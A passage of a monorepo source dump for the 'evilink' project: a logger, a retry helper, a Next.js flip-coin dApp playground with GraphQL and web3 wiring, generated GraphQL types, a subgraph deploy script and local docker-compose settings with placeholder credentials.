  [LEVEL.FATAL]: chalk.red(`${LEVEL.FATAL.toUpperCase()}`),
  [LEVEL.ERROR]: chalk.red(`${LEVEL.ERROR.toUpperCase()}`),
  [LEVEL.WARN]: chalk.yellow(` ${LEVEL.WARN.toUpperCase()}`),
  [LEVEL.INFO]: chalk.green(` ${LEVEL.INFO.toUpperCase()}`),
  [LEVEL.DEBUG]: chalk.gray(`${LEVEL.DEBUG.toUpperCase()}`),
  [LEVEL.TRACE]: chalk.gray(`${LEVEL.TRACE.toUpperCase()}`),
}

const timestampFormat = format((info) => {
  info.unixTimestamp = Date.now()
  info.timestamp = chalk.gray(
    dayjs(info.unixTimestamp || info.timestamp).format('YYYY/MM/DD HH:mm:ss'),
  )
  return info
})

const simpleFormat = format.printf(
  ({ prefix = 'ANONYMOUS', level, message, timestamp }) =>
    fmt(
      '%s %s %s %s',
      timestamp,
      COLORIZED_LEVEL[level],
      chalk.magenta(
        prefix.replace(/([a-z0-9])([A-Z])/g, '$1_$2').toUpperCase(),
      ),
      message,
    ),
)

const logger = loggers.get('default', {
  levels: LEVEL_NUMBER,
  transports: [
    new transports.Console({
      level:
        { production: LEVEL.INFO, debug: LEVEL.TRACE }?.[
          process.env.NODE_ENV
        ] ?? LEVEL.DEBUG,
    }),
  ],
  format: format.combine(timestampFormat(), simpleFormat),
})

export default logger

'''
'''--- packages/evilthereum/src/util/retry.ts ---
/* eslint-disable no-constant-condition, no-await-in-loop */

// eslint-disable-next-line import/prefer-default-export
export const retryUntilSuccess = async <T>(
  fn: () => Promise<T>,
  interval: number,
  {
    beforeEach = () => {},
    afterSuccess = () => {},
    afterFailure = () => {},
  }: {
    beforeEach?: () => void
    afterSuccess?: (result: T) => void
    afterFailure?: (error: any) => void
  },
): Promise<T> => {
  beforeEach()
  return fn()
    .then((result) => {
      afterSuccess(result)
      return result
    })
    .catch(async (error) => {
      afterFailure(error)
      await new Promise((o) => setTimeout(o, interval))
      return retryUntilSuccess(fn, interval, {
        beforeEach,
        afterSuccess,
        afterFailure,
      })
    })
}

'''
'''--- packages/evilthereum/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/playground/README.md ---
# @evilink/playground

## Development

### Prepare Dependencies

Playground depends on a running graph-node serving GQL api, we can use [`script/docker-compose.yml`](/script/docker-compose.yml) for help

```bash
bash ../../script/run.sh up \
  postgres \
  ipfs \
  evilthereum \ # port 8577 is needed for rpc
  chainlink \
  graph-node # port 8000, 8001 is needed for gql api
```

Then deploy subgraph

```bash
VICTIM_CONTRACT=TODO
bash ../../script/run.sh deploy_subgraph ${VICTIM_CONTRACT}
```

Finally

```bash
yarn dev
```

## Credit

- The awesome flipping coin logo in pure css is made by [Hoonseok Park](https://codepen.io/parcon) in [codepen](https://codepen.io/parcon/pen/oxbLVd?editors=1100)

'''
'''--- packages/playground/config/index.ts ---
import getConfig from 'next/config'
import mergeDeepRight from 'ramda/src/mergeDeepRight'
import publicRuntime from '~/config/publicRuntime'

type RuntimeConfig = typeof publicRuntime & {
  dev: boolean
  prod: boolean
}

const { publicRuntimeConfig } = getConfig()

const config = mergeDeepRight(publicRuntimeConfig, {
  dev: process.env.NODE_ENV !== 'production',
  prod: process.env.NODE_ENV === 'production',
})

export default config as RuntimeConfig

'''
'''--- packages/playground/config/publicRuntime.js ---
const config = {
  theGraph: {
    httpEndpoint:
      process.env.THE_GRAPH_HTTP_ENDPOINT || 'http://localhost:8000',
    wsEndpoint: process.env.THE_GRAPH_WS_ENDPOINT || 'ws://localhost:8001',
  },
  ethereum: {
    chainId: parseInt(process.env.ETHEREUM_CHAIN_ID, 10) || 3777,
    rpcEndpoint: process.env.ETHEREUM_RPC_ENDPOINT || 'http://localhost:8577',
  },
}

module.exports = config

'''
'''--- packages/playground/constant/index.ts ---
export const ROUTES = {
  FLIPCOIN: '/flipcoin',
}

'''
'''--- packages/playground/context/apollo/client.ts ---
import { split, HttpLink, ApolloClient, InMemoryCache } from '@apollo/client'
import { getMainDefinition } from '@apollo/client/utilities'
import { OperationDefinitionNode } from 'graphql'
import { WebSocketLink } from '@apollo/client/link/ws'
import { SubscriptionClient } from 'subscriptions-transport-ws'
import { isServer } from '~/util/env'

export type CreateClientOptions = {
  httpUri: string
  wsUri?: string
}

export const createClient = (options: CreateClientOptions) => {
  let link
  if (options.wsUri) {
    link = split(
      ({ query }) => {
        const { kind, operation } = getMainDefinition(
          query,
        ) as OperationDefinitionNode
        return kind === 'OperationDefinition' && operation === 'subscription'
      },
      new WebSocketLink(
        new SubscriptionClient(
          options.wsUri.replace(/(http)(s)?:\/\//, 'ws$2://'),
          {
            reconnect: true,
          },
          isServer() && require('ws'), // eslint-disable-line global-require
        ),
      ),
      new HttpLink({ uri: options.httpUri }),
    )
  } else {
    link = new HttpLink({ uri: options.httpUri })
  }
  return new ApolloClient({
    link,
    cache: new InMemoryCache(),
  })
}

'''
'''--- packages/playground/context/apollo/index.ts ---
import { createElement, FC } from 'react'
import { ApolloProvider as BaseApolloProvider } from '@apollo/client'
import { createClient, CreateClientOptions } from './client'

export const ApolloProvider: FC<{ options: CreateClientOptions }> = ({
  children,
  options,
}) =>
  createElement(BaseApolloProvider, {
    client: createClient(options),
    children,
  })

'''
'''--- packages/playground/context/apollo/query/flipcoin.ts ---
import { gql, QueryResult, SubscriptionResult } from '@apollo/client'
// Type
import { FlipCoin, Player } from '~/type/flipcoin'

export type QueryAllData = {
  flipCoins: FlipCoin[]
  players: Player[]
}

export type QueryAllResult = QueryResult<QueryAllData>

export const QUERY_ALL = gql`
  query {
    flipCoins {
      id
      owner
      jackpot
    }
    players {
      id
      address
      balance
      netReward
      playCount
      playWinCount
      playLoseCount
    }
  }
`

export type SubscribePlayerData = {
  players: Player[]
}

export type SubscribePlayerResult = SubscriptionResult<SubscribePlayerData>

export const SUBSCRIBE_PLAYER = gql`
  subscription {
    players {
      id
      address
      balance
      netReward
      playCount
      playWinCount
      playLoseCount
    }
  }
`

'''
'''--- packages/playground/context/theme/colors.ts ---
/* eslint-disable no-bitwise */

import theme from '@chakra-ui/theme'

type ColorHues = {
  50: string
  100: string
  200: string
  300: string
  400: string
  500: string
  600: string
  700: string
  800: string
  900: string
}

const ALPHAS = [...Array(19)].map((_, i) => (i + 1) * 5)

const hexToRgba = (hex: string, alpha: number) => {
  const bigint = parseInt(hex.replace('#', ''), 16)
  const r = (bigint >> 16) & 255
  const g = (bigint >> 8) & 255
  const b = bigint & 255

  return `rgba(${r}, ${g}, ${b}, ${alpha / 100})`
}

const alphaExtended = (colors: Record<string, ColorHues | string>) =>
  Object.entries(colors)
    .filter(([, hues]) => typeof hues === 'object')
    .reduce(
      (prev1, [color, hues]) => ({
        ...prev1,
        ...ALPHAS.reduce(
          (prev2, alpha) => ({
            ...prev2,
            [`${color}Alpha${`${alpha}`.padStart(2, '0')}`]: Object.entries(
              hues,
            ).reduce(
              (hueExtended, [hue, rgb]) => ({
                ...hueExtended,
                [hue]: hexToRgba(rgb, alpha),
              }),
              {},
            ),
          }),
          {},
        ),
      }),
      {},
    )

const colors = {
  ...theme.colors,
  ...alphaExtended(theme.colors),
}

export default colors

'''
'''--- packages/playground/context/theme/components/button.ts ---
import { StyleConfig } from '@chakra-ui/theme-tools'

const button: Record<string, StyleConfig> = {
  Button: {
    variants: {
      unstyled: {
        outline: 'none',
        borderRadius: 0,
        boxShadow: 'none',
        _focus: {
          boxShadow: 'none',
        },
        minWidth: 0,
        padding: 0,
        _hover: {},
      },
    },
  },
}

export default button

'''
'''--- packages/playground/context/theme/components/heading.ts ---
import { StyleConfig } from '@chakra-ui/theme-tools'
import styles from '~/context/theme/styles'

const button: Record<string, StyleConfig> = {
  Heading: {
    variants: {
      mono: {
        fontFamily: styles.global.body.fontFamily,
      },
    },
  },
}

export default button

'''
'''--- packages/playground/context/theme/components/index.ts ---
import button from '~/context/theme/components/button'
import heading from '~/context/theme/components/heading'

const componentes = {
  ...button,
  ...heading,
}

export default componentes

'''
'''--- packages/playground/context/theme/index.ts ---
import { createElement, PropsWithChildren } from 'react'
import { ChakraProvider } from '@chakra-ui/react'
import theme from '~/context/theme/theme'

export const ThemeProvider = ({ children }: PropsWithChildren<{}>) =>
  createElement(ChakraProvider, { theme, children })

'''
'''--- packages/playground/context/theme/styles.ts ---
const styles = {
  global: {
    body: {
      fontFamily: 'Courier, monospace',
    },
    '#__next': {
      minH: '100vh',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'stretch',
    },
  },
}

export default styles

'''
'''--- packages/playground/context/theme/theme.ts ---
import { extendTheme } from '@chakra-ui/react'
import components from '~/context/theme/components'
import styles from '~/context/theme/styles'
import colors from '~/context/theme/colors'

const override = {
  config: {
    useSystemColorMode: false,
    initialColorMode: 'light',
  },
  components,
  styles,
  colors,
  shadows: { outline: 'none' },
}

export default extendTheme(override)

'''
'''--- packages/playground/context/web3/connector.ts ---
import { AbstractConnector } from '@web3-react/abstract-connector'
import config from '~/config'
import { isBrowser } from '~/util/env'

declare global {
  interface Window {
    ethereum: any
  }
}

export type ConnectorKind = 'injected'

export type Connector = {
  id: ConnectorKind
  available: boolean
  instance?: AbstractConnector
  init: () => Promise<AbstractConnector>
}

export const connectors = Array<Connector>({
  id: 'injected',
  init: async (): Promise<AbstractConnector> => {
    const { InjectedConnector } = await import('@web3-react/injected-connector')
    return new InjectedConnector({
      supportedChainIds: [config.ethereum.chainId],
    })
  },
  available: isBrowser() && window.ethereum,
}).map((connector: Connector) => {
  const { init } = connector
  // eslint-disable-next-line no-param-reassign
  connector.init = async () => {
    if (!connector.instance) {
      // eslint-disable-next-line no-param-reassign
      connector.instance = await init()
    }
    return connector.instance
  }
  return connector
})

'''
'''--- packages/playground/context/web3/index.ts ---
import { useState, useEffect, createElement, PropsWithChildren } from 'react'
import { Web3ReactProvider } from '@web3-react/core'
import { GetLibrary, getLibraryAsync } from './util'

export const Web3Provider = ({ children }: PropsWithChildren<{}>) => {
  // Local state
  const [options, setOptions] = useState<{ getLibrary: GetLibrary }>({
    getLibrary: () => ({}),
  })
  // Effect
  useEffect(() => {
    getLibraryAsync().then((getLibrary) => {
      setOptions({ getLibrary })
    })
  }, [setOptions])
  // Render
  return createElement(Web3ReactProvider, {
    getLibrary: options.getLibrary,
    children,
  })
}

export { UnsupportedChainIdError } from '@web3-react/core'
export * from './connector'

'''
'''--- packages/playground/context/web3/util.ts ---
import { Web3ReactContextInterface } from '@web3-react/core/dist/types'

export type GetLibrary = (
  provider?: any,
  connector?: Required<Web3ReactContextInterface>['connector'],
) => any

export const getLibraryAsync = async (): Promise<GetLibrary> => {
  const { Web3Provider } = await import('@ethersproject/providers')
  return (provider?: any) => {
    if (!provider) {
      return undefined
    }
    const library = new Web3Provider(provider)
    library.pollingInterval = 12000
    return library
  }
}

'''
'''--- packages/playground/graphql-config.yml ---
schema:
- http://localhost:8000/subgraphs/name/flipcoin
generates:
  ./type/flipcoin.d.ts:
    plugins:
    - add:
        content: |
          // DO NOT EDIT!!! Generated by graphql-codegen.
          /* eslint-disable */
    - typescript

'''
'''--- packages/playground/hook/useBool.ts ---
import { useState, useCallback } from 'react'

const useBool = (
  initialState: boolean = false,
): [boolean, () => void, () => void] => {
  const [bool, setBool] = useState(initialState)
  return [
    bool,
    useCallback(() => setBool(true), []),
    useCallback(() => setBool(false), []),
  ]
}

export default useBool

'''
'''--- packages/playground/hook/useWeb3.ts ---
import { useMemo } from 'react'
import { useWeb3React } from '@web3-react/core'
import { Web3Provider } from '@ethersproject/providers'

const useEther = () => useWeb3React<Web3Provider>()

type UseWeb3 = ReturnType<typeof useEther> & {
  account?: string
  connected: boolean
}

const useWeb3 = (): UseWeb3 => {
  const { account: accountDirty, ...web3 } = useWeb3React<Web3Provider>()
  const account = accountDirty?.toLowerCase()
  return {
    ...web3,
    account,
    connected: useMemo(() => !!account, [account]),
  }
}

export default useWeb3

'''
'''--- packages/playground/next-env.d.ts ---
/// <reference types="next" />
/// <reference types="next/types/global" />

'''
'''--- packages/playground/next.config.js ---
/* eslint-disable global-require */
/* eslint-disable import/no-extraneous-dependencies */

const { PHASE_PRODUCTION_BUILD } = require('next/constants')
const { withPlugins, optional } = require('next-compose-plugins')
const publicRuntimeConfig = require('./config/publicRuntime')

const config = {
  trailingSlash: false,
  reactStrictMode: true,
  publicRuntimeConfig,
  // NOTE: Temperary workaround for not-implemented homepage
  async redirects() {
    return [
      {
        source: '/',
        destination: '/flipcoin',
        permanent: true,
      },
    ]
  },
}

const plugins = [
  [
    optional(() =>
      require('@next/bundle-analyzer')({
        enabled: process.env.BUNDLE_ANALYZER === 'true',
      }),
    ),
    [PHASE_PRODUCTION_BUILD],
  ],
]

module.exports = withPlugins(plugins, config)

'''
'''--- packages/playground/package.json ---
{
  "name": "@evilink/playground",
  "version": "0.1.0",
  "scripts": {
    "dev": "next",
    "build": "next build",
    "start": "next start",
    "codegen:graphql": "graphql-codegen --config ./graphql-config.yml"
  },
  "dependencies": {
    "@apollo/client": "^3.3.6",
    "@chakra-ui/react": "^1.0.3",
    "@chakra-ui/theme": "^1.2.2",
    "@chakra-ui/theme-tools": "^1.0.2",
    "@emotion/react": "^11.1.2",
    "@emotion/styled": "^11.0.0",
    "@ethersproject/keccak256": "^5.0.7",
    "@ethersproject/providers": "^5.0.17",
    "@ethersproject/wallet": "^5.0.10",
    "@evilink/constant": "workspace:packages/constant",
    "@evilink/contracts-faucet": "workspace:contracts/faucet",
    "@evilink/contracts-flipcoin": "workspace:contracts/flipcoin",
    "@web3-react/abstract-connector": "^6.0.7",
    "@web3-react/core": "^6.1.1",
    "beautiful-react-hooks": "^0.31.0",
    "framer-motion": "^2.9.5",
    "graphql": "^15.4.0",
    "next": "^10.0.3",
    "next-compose-plugins": "^2.2.1",
    "ramda": "^0.27.1",
    "react": "^17.0.1",
    "react-dom": "^17.0.1",
    "react-jazzicon": "^0.1.3",
    "subscriptions-transport-ws": "^0.9.18",
    "ws": "^7.4.2"
  },
  "devDependencies": {
    "@emotion/babel-plugin": "^11.1.2",
    "@graphql-codegen/typescript": "^1.20.0",
    "@next/bundle-analyzer": "^10.0.4",
    "@types/node": "^14.14.13",
    "@types/ramda": "^0.27.33",
    "@types/react": "^17.0.0",
    "@types/react-dom": "^17.0.0",
    "@types/react-redux": "^7.1.14",
    "@types/webpack-env": "^1.16.0",
    "@types/ws": "^7.4.0",
    "@web3-react/injected-connector": "^6.0.7",
    "eslint-import-resolver-alias": "^1.1.2",
    "eslint-plugin-jsx-a11y": "^6.3.1",
    "eslint-plugin-prettier": "^3.3.0",
    "eslint-plugin-react": "^7.20.3",
    "eslint-plugin-react-hooks": "^4.0.8",
    "typescript": "^4.1.3"
  },
  "resolutions": {
    "webpack": "^5.11.1"
  },
  "license": "MIT"
}

'''
'''--- packages/playground/tsconfig.json ---
{
  "compilerOptions": {
    "target": "esnext",
    "module": "esnext",
    "jsx": "preserve",
    "lib": ["dom", "es2017", "es2019"],
    "moduleResolution": "node",
    "allowJs": true,
    "noEmit": true,
    "strict": true,
    "allowSyntheticDefaultImports": true,
    "skipLibCheck": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "removeComments": false,
    "preserveConstEnums": true,
    "sourceMap": true,
    "esModuleInterop": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "baseUrl": ".",
    "paths": {
      "~/*": ["./*"]
    },
    "typeRoots": ["node_modules/@types"]
  },
  "exclude": ["node_modules"],
  "include": ["type/*.d.ts", "**/*.js", "**/*.ts", "**/*.tsx"]
}

'''
'''--- packages/playground/type/flipcoin.d.ts ---
// DO NOT EDIT!!! Generated by graphql-codegen.
/* eslint-disable */

export type Maybe<T> = T | null;
export type Exact<T extends { [key: string]: unknown }> = { [K in keyof T]: T[K] };
export type MakeOptional<T, K extends keyof T> = Omit<T, K> & { [SubKey in K]?: Maybe<T[SubKey]> };
export type MakeMaybe<T, K extends keyof T> = Omit<T, K> & { [SubKey in K]: Maybe<T[SubKey]> };
/** All built-in and custom scalars, mapped to their actual values */
export type Scalars = {
  ID: string;
  String: string;
  Boolean: boolean;
  Int: number;
  Float: number;
  BigDecimal: any;
  BigInt: any;
  Bytes: any;
};

export type Block_Height = {
  hash?: Maybe<Scalars['Bytes']>;
  number?: Maybe<Scalars['Int']>;
};

export type FlipCoin = {
  __typename?: 'FlipCoin';
  id: Scalars['ID'];
  owner: Scalars['Bytes'];
  jackpot: Scalars['BigInt'];
};

export type FlipCoin_Filter = {
  id?: Maybe<Scalars['ID']>;
  id_not?: Maybe<Scalars['ID']>;
  id_gt?: Maybe<Scalars['ID']>;
  id_lt?: Maybe<Scalars['ID']>;
  id_gte?: Maybe<Scalars['ID']>;
  id_lte?: Maybe<Scalars['ID']>;
  id_in?: Maybe<Array<Scalars['ID']>>;
  id_not_in?: Maybe<Array<Scalars['ID']>>;
  owner?: Maybe<Scalars['Bytes']>;
  owner_not?: Maybe<Scalars['Bytes']>;
  owner_in?: Maybe<Array<Scalars['Bytes']>>;
  owner_not_in?: Maybe<Array<Scalars['Bytes']>>;
  owner_contains?: Maybe<Scalars['Bytes']>;
  owner_not_contains?: Maybe<Scalars['Bytes']>;
  jackpot?: Maybe<Scalars['BigInt']>;
  jackpot_not?: Maybe<Scalars['BigInt']>;
  jackpot_gt?: Maybe<Scalars['BigInt']>;
  jackpot_lt?: Maybe<Scalars['BigInt']>;
  jackpot_gte?: Maybe<Scalars['BigInt']>;
  jackpot_lte?: Maybe<Scalars['BigInt']>;
  jackpot_in?: Maybe<Array<Scalars['BigInt']>>;
  jackpot_not_in?: Maybe<Array<Scalars['BigInt']>>;
};

export enum FlipCoin_OrderBy {
  Id = 'id',
  Owner = 'owner',
  Jackpot = 'jackpot'
}

export enum OrderDirection {
  Asc = 'asc',
  Desc = 'desc'
}

export type PlayEvent = {
  __typename?: 'PlayEvent';
  id: Scalars['ID'];
  player: Scalars['Bytes'];
  side: Scalars['Boolean'];
};

export type PlayEvent_Filter = {
  id?: Maybe<Scalars['ID']>;
  id_not?: Maybe<Scalars['ID']>;
  id_gt?: Maybe<Scalars['ID']>;
  id_lt?: Maybe<Scalars['ID']>;
  id_gte?: Maybe<Scalars['ID']>;
  id_lte?: Maybe<Scalars['ID']>;
  id_in?: Maybe<Array<Scalars['ID']>>;
  id_not_in?: Maybe<Array<Scalars['ID']>>;
  player?: Maybe<Scalars['Bytes']>;
  player_not?: Maybe<Scalars['Bytes']>;
  player_in?: Maybe<Array<Scalars['Bytes']>>;
  player_not_in?: Maybe<Array<Scalars['Bytes']>>;
  player_contains?: Maybe<Scalars['Bytes']>;
  player_not_contains?: Maybe<Scalars['Bytes']>;
  side?: Maybe<Scalars['Boolean']>;
  side_not?: Maybe<Scalars['Boolean']>;
  side_in?: Maybe<Array<Scalars['Boolean']>>;
  side_not_in?: Maybe<Array<Scalars['Boolean']>>;
};

export enum PlayEvent_OrderBy {
  Id = 'id',
  Player = 'player',
  Side = 'side'
}

export type Player = {
  __typename?: 'Player';
  id: Scalars['ID'];
  address: Scalars['Bytes'];
  balance: Scalars['BigInt'];
  netReward: Scalars['BigInt'];
  playCount: Scalars['BigInt'];
  playWinCount: Scalars['BigInt'];
  playLoseCount: Scalars['BigInt'];
};

export type Player_Filter = {
  id?: Maybe<Scalars['ID']>;
  id_not?: Maybe<Scalars['ID']>;
  id_gt?: Maybe<Scalars['ID']>;
  id_lt?: Maybe<Scalars['ID']>;
  id_gte?: Maybe<Scalars['ID']>;
  id_lte?: Maybe<Scalars['ID']>;
  id_in?: Maybe<Array<Scalars['ID']>>;
  id_not_in?: Maybe<Array<Scalars['ID']>>;
  address?: Maybe<Scalars['Bytes']>;
  address_not?: Maybe<Scalars['Bytes']>;
  address_in?: Maybe<Array<Scalars['Bytes']>>;
  address_not_in?: Maybe<Array<Scalars['Bytes']>>;
  address_contains?: Maybe<Scalars['Bytes']>;
  address_not_contains?: Maybe<Scalars['Bytes']>;
  balance?: Maybe<Scalars['BigInt']>;
  balance_not?: Maybe<Scalars['BigInt']>;
  balance_gt?: Maybe<Scalars['BigInt']>;
  balance_lt?: Maybe<Scalars['BigInt']>;
  balance_gte?: Maybe<Scalars['BigInt']>;
  balance_lte?: Maybe<Scalars['BigInt']>;
  balance_in?: Maybe<Array<Scalars['BigInt']>>;
  balance_not_in?: Maybe<Array<Scalars['BigInt']>>;
  netReward?: Maybe<Scalars['BigInt']>;
  netReward_not?: Maybe<Scalars['BigInt']>;
  netReward_gt?: Maybe<Scalars['BigInt']>;
  netReward_lt?: Maybe<Scalars['BigInt']>;
  netReward_gte?: Maybe<Scalars['BigInt']>;
  netReward_lte?: Maybe<Scalars['BigInt']>;
  netReward_in?: Maybe<Array<Scalars['BigInt']>>;
  netReward_not_in?: Maybe<Array<Scalars['BigInt']>>;
  playCount?: Maybe<Scalars['BigInt']>;
  playCount_not?: Maybe<Scalars['BigInt']>;
  playCount_gt?: Maybe<Scalars['BigInt']>;
  playCount_lt?: Maybe<Scalars['BigInt']>;
  playCount_gte?: Maybe<Scalars['BigInt']>;
  playCount_lte?: Maybe<Scalars['BigInt']>;
  playCount_in?: Maybe<Array<Scalars['BigInt']>>;
  playCount_not_in?: Maybe<Array<Scalars['BigInt']>>;
  playWinCount?: Maybe<Scalars['BigInt']>;
  playWinCount_not?: Maybe<Scalars['BigInt']>;
  playWinCount_gt?: Maybe<Scalars['BigInt']>;
  playWinCount_lt?: Maybe<Scalars['BigInt']>;
  playWinCount_gte?: Maybe<Scalars['BigInt']>;
  playWinCount_lte?: Maybe<Scalars['BigInt']>;
  playWinCount_in?: Maybe<Array<Scalars['BigInt']>>;
  playWinCount_not_in?: Maybe<Array<Scalars['BigInt']>>;
  playLoseCount?: Maybe<Scalars['BigInt']>;
  playLoseCount_not?: Maybe<Scalars['BigInt']>;
  playLoseCount_gt?: Maybe<Scalars['BigInt']>;
  playLoseCount_lt?: Maybe<Scalars['BigInt']>;
  playLoseCount_gte?: Maybe<Scalars['BigInt']>;
  playLoseCount_lte?: Maybe<Scalars['BigInt']>;
  playLoseCount_in?: Maybe<Array<Scalars['BigInt']>>;
  playLoseCount_not_in?: Maybe<Array<Scalars['BigInt']>>;
};

export enum Player_OrderBy {
  Id = 'id',
  Address = 'address',
  Balance = 'balance',
  NetReward = 'netReward',
  PlayCount = 'playCount',
  PlayWinCount = 'playWinCount',
  PlayLoseCount = 'playLoseCount'
}

export type Query = {
  __typename?: 'Query';
  flipCoin?: Maybe<FlipCoin>;
  flipCoins: Array<FlipCoin>;
  player?: Maybe<Player>;
  players: Array<Player>;
  playEvent?: Maybe<PlayEvent>;
  playEvents: Array<PlayEvent>;
  /** Access to subgraph metadata */
  _meta?: Maybe<_Meta_>;
};

export type QueryFlipCoinArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type QueryFlipCoinsArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<FlipCoin_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<FlipCoin_Filter>;
  block?: Maybe<Block_Height>;
};

export type QueryPlayerArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type QueryPlayersArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<Player_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<Player_Filter>;
  block?: Maybe<Block_Height>;
};

export type QueryPlayEventArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type QueryPlayEventsArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<PlayEvent_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<PlayEvent_Filter>;
  block?: Maybe<Block_Height>;
};

export type Query_MetaArgs = {
  block?: Maybe<Block_Height>;
};

export type Subscription = {
  __typename?: 'Subscription';
  flipCoin?: Maybe<FlipCoin>;
  flipCoins: Array<FlipCoin>;
  player?: Maybe<Player>;
  players: Array<Player>;
  playEvent?: Maybe<PlayEvent>;
  playEvents: Array<PlayEvent>;
  /** Access to subgraph metadata */
  _meta?: Maybe<_Meta_>;
};

export type SubscriptionFlipCoinArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type SubscriptionFlipCoinsArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<FlipCoin_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<FlipCoin_Filter>;
  block?: Maybe<Block_Height>;
};

export type SubscriptionPlayerArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type SubscriptionPlayersArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<Player_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<Player_Filter>;
  block?: Maybe<Block_Height>;
};

export type SubscriptionPlayEventArgs = {
  id: Scalars['ID'];
  block?: Maybe<Block_Height>;
};

export type SubscriptionPlayEventsArgs = {
  skip?: Maybe<Scalars['Int']>;
  first?: Maybe<Scalars['Int']>;
  orderBy?: Maybe<PlayEvent_OrderBy>;
  orderDirection?: Maybe<OrderDirection>;
  where?: Maybe<PlayEvent_Filter>;
  block?: Maybe<Block_Height>;
};

export type Subscription_MetaArgs = {
  block?: Maybe<Block_Height>;
};

export type _Block_ = {
  __typename?: '_Block_';
  /** The hash of the block */
  hash?: Maybe<Scalars['Bytes']>;
  /** The block number */
  number: Scalars['Int'];
};

/** The type for the top-level _meta field */
export type _Meta_ = {
  __typename?: '_Meta_';
  /**
   * Information about a specific subgraph block. The hash of the block
   * will be null if the _meta field has a block constraint that asks for
   * a block number. It will be filled if the _meta field has no block constraint
   * and therefore asks for the latest  block
   */
  block: _Block_;
  /** The deployment ID */
  deployment: Scalars['String'];
  /** If `true`, the subgraph encountered indexing errors at some past block */
  hasIndexingErrors: Scalars['Boolean'];
};

export enum _SubgraphErrorPolicy_ {
  /** Data will be returned even if the subgraph has indexing errors */
  Allow = 'allow',
  /** If the subgraph has indexing errors, data will be omitted. The default. */
  Deny = 'deny'
}

'''
'''--- packages/playground/type/next-env.d.ts ---
/// <reference types="next" />
/// <reference types="next/types/global" />

'''
'''--- packages/playground/type/react-jazzicon.d.ts ---
declare module 'react-jazzicon'

'''
'''--- packages/playground/util/env.ts ---
export const isBrowser = () => typeof window !== 'undefined'

export const isServer = () => !isBrowser()

'''
'''--- packages/playground/util/scroll-control.ts ---
// Reference: https://stackoverflow.com/a/4770179/13177330

import { isBrowser } from './env'

const preventDefault = (e: Event) => {
  e.preventDefault()
}

let supportsPassive = false
try {
  if (isBrowser()) {
    // @ts-ignore
    window.addEventListener(
      'test',
      null,
      Object.defineProperty({}, 'passive', {
        get: () => {
          supportsPassive = true
        },
      }),
    )
  }
} catch {
  // noop
}

const wheelOpt = supportsPassive ? { passive: false } : false
// eslint-disable-next-line no-nested-ternary
const wheelEvent = isBrowser()
  ? 'onwheel' in document.createElement('div')
    ? 'wheel'
    : 'mousewheel'
  : ''

export const disableScroll = () => {
  if (isBrowser()) {
    window.addEventListener('DOMMouseScroll', preventDefault, false)
    window.addEventListener(wheelEvent, preventDefault, wheelOpt)
    window.addEventListener('touchmove', preventDefault, wheelOpt)
  }
}

export const enableScroll = () => {
  if (isBrowser()) {
    window.removeEventListener('DOMMouseScroll', preventDefault, false)
    // @ts-ignore
    window.removeEventListener(wheelEvent, preventDefault, wheelOpt)
    // @ts-ignore
    window.removeEventListener('touchmove', preventDefault, wheelOpt)
  }
}

'''
'''--- packages/playground/util/string.ts ---
export const ellipseAddress = (address: string) =>
  (address && `${address.slice(0, 6)}...${address.slice(-4)}`) || ''

'''
'''--- script/deploy-subgraph.sh ---
#!/bin/bash

set -eo pipefail

IPFS_URI="${IPFS_URI:-http://localhost:5001}"
THE_GRAPH_ADMIN_URI="${THE_GRAPH_ADMIN_URI:-http://localhost:8020}"

main() {
    SUBGRAPH=$1
    if [ -z "$SUBGRAPH" ]; then echo "subgraph name is required" && exit 1; else shift; fi

    graph create --node "$THE_GRAPH_ADMIN_URI" "$SUBGRAPH"
    graph deploy --node "$THE_GRAPH_ADMIN_URI" --ipfs "$IPFS_URI" "$SUBGRAPH"
}

main "$@"

'''
'''--- script/docker-compose.sample.env ---
POSTGRES_USER=admin
POSTGRES_PASSWORD=admin
POSTGRES_DB=admin
CHAINLINK_USER=chainlinkuser
CHAINLINK_PASSWORD=chainlinkpassword
CHAINLINK_DB=chainlink
THE_GRAPH_USER=thegraphuser
THE_GRAPH_PASSWORD=thegraphpassword
THE_GRAPH_DB=thegraph
CHAIN_ID=3777
CHAIN_DB_PATH=/evilthereum/chaindb
RPC_PORT=8577
HTTP_PROTOCOL=http
THE_GRAPH_HTTP_HOST=127.0.0.1:8000
THE_GRAPH_WS_HOST=127.0.0.1:8001
EVILTHEREUM_RPC_HOST=127.0.0.1:8577
PLAYGROUND_HTTP_HOST=127.0.0.1:3000

'''
'''--- script/docker-compose.yml ---
version: '3.8'
services:
  postgres:
    image: postgres:12.5
    restart: always
    environment:
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      POSTGRES_DB: ${POSTGRES_DB}
      CHAINLINK_USER: ${CHAINLINK_USER}
      CHAINLINK_PASSWORD: ${CHAINLINK_PASSWORD}
      CHAINLINK_DB: ${CHAINLINK_DB}
